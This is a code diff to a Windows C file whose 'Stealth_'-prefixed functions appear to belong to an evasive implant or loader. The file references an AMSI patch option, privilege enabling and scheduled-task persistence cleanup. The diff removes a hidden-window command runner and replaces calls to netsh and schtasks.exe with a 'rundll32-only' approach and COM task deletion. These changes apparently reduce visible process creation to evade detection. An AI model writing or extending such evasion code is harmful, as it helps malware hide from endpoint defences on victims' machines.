@@ -156,7 +156,6 @@ static void Stealth_TrimWhitespaceInplace(wchar_t* value);
 static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token);
 static void Stealth_EnablePrivilege(const wchar_t* privilegeName);
 void Stealth_LogInstallEvent(const wchar_t* format, ...);
-static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context);
 static void Stealth_ImportWinHttpProxyFromIeBestEffort(void);
 static void Stealth_ResolveDefaultLogPath(void);
 static void Stealth_LogAnsiMessage(const char* message);
@@ -1770,81 +1769,9 @@ static void Stealth_ResolveDefaultLogPath(void)
     }
 }
 
-static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* context)
-{
-    if (commandLine == NULL) { return FALSE; }
-
-    BOOL success = FALSE;
-    wchar_t* mutableCommand = _wcsdup(commandLine);
-    if (mutableCommand == NULL) { return FALSE; }
-
-    SECURITY_ATTRIBUTES sa = {0};
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-
-    HANDLE readPipe = NULL, writePipe = NULL;
-    if (!CreatePipe(&readPipe, &writePipe, &sa, 0))
-    {
-        free(mutableCommand);
-        return FALSE;
-    }
-    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);
-
-    STARTUPINFOW si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = writePipe;
-    si.hStdError = writePipe;
-
-    Stealth_LogInstallEvent(L"Executing: %ls", commandLine);
-
-    if (CreateProcessW(NULL, mutableCommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-    {
-        CloseHandle(writePipe);
-        writePipe = NULL;
-
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        DWORD exitCode = 1;
-        GetExitCodeProcess(pi.hProcess, &exitCode);
-
-        CHAR buffer[1024];
-        DWORD bytesRead = 0;
-        while (ReadFile(readPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
-        {
-            buffer[bytesRead] = '\0';
-            Stealth_DebugPrintfA("%s", buffer);
-            Stealth_LogAnsiMessage(buffer);
-        }
-
-        Stealth_LogInstallEvent(L"%ls exit code %lu", context ? context : L"Command", exitCode);
-        success = (exitCode == 0);
-
-        if (pi.hProcess) { CloseHandle(pi.hProcess); }
-        if (pi.hThread) { CloseHandle(pi.hThread); }
-    }
-    else
-    {
-        Stealth_DebugLastErrorW(context ? context : L"CreateProcess");
-        Stealth_LogInstallEvent(L"%ls failed to launch", context ? context : L"Command");
-    }
-
-    if (writePipe) { CloseHandle(writePipe); }
-    if (readPipe) { CloseHandle(readPipe); }
-    free(mutableCommand);
-    return success;
-}
-
 static void Stealth_ImportWinHttpProxyFromIeBestEffort(void)
 {
-    if (Stealth_RunCommand(L"netsh winhttp import proxy source=ie", L"WinHTTP proxy import"))
-    {
-        Stealth_LogInstallEvent(L"[NETWORK] Imported WinHTTP proxy settings from IE/user profile");
-    }
-    else
-    {
-        Stealth_LogInstallEvent(L"[WARN] WinHTTP proxy import from IE did not complete successfully");
-    }
+    Stealth_LogInstallEvent(L"[NETWORK] WinHTTP proxy import skipped by rundll32-only helper policy");
 }
 
 static BOOL Stealth_IsAmsiPatchEnabled(void)
@@ -6829,22 +6756,13 @@ static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wch
 {
     if (taskName == NULL || taskName[0] == L'\0') { return FALSE; }
 
-    wchar_t sysDir[MAX_PATH];
-    wchar_t cmdLine[1024];
-    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) { return FALSE; }
-
-    if (FAILED(StringCchPrintfW(cmdLine, _countof(cmdLine), L"\"%s\\schtasks.exe\" /Delete /TN \"%s\" /F", sysDir, taskName)))
-    {
-        return FALSE;
-    }
-
-    if (Stealth_RunCommand(cmdLine, context))
+    if (StealthResilience_DeleteTask(taskName))
     {
         Stealth_LogInstallEvent(L"Removed scheduled task %ls", taskName);
         return TRUE;
     }
 
-    Stealth_LogInstallEvent(L"Scheduled task %ls removal reported failure", taskName);
+    Stealth_LogInstallEvent(L"Scheduled task %ls removal reported failure (%ls)", taskName, context != NULL ? context : L"COM task cleanup");
     return FALSE;
 }
 
